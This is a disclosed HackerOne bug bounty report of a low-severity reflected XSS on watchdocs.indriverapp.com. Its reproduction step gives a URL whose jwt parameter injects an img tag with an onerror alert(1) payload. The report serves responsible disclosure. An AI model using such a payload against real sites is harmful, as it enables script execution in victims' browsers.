# #3 XSS on watchdocs.indriverapp.com

## Report Details
- **Report ID**: 2028265
- **URL**: https://hackerone.com/reports/2028265
- **State**: Closed
- **Severity**: low
- **Submitted**: 2023-06-16T01:50:00.169Z
- **Disclosed**: 2024-04-11T08:33:03.409Z

## Reporter
- **Username**: maxdha
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: indrive

## Vulnerability Information
## Summary:
Found an XSS

## Steps To Reproduce:

  1. Go to https://watchdocs.indriverapp.com/webview/v1/transport-change?phone=██████&token=█████████&service=intercity3&jwt=fw%22%3E%3Cimg%20src=fwa%20onerror=alert(1)%3E
  

## Supporting Material/References:
████

## Impact

Execute Javascript on any victim browser

## Attachments
No attachments
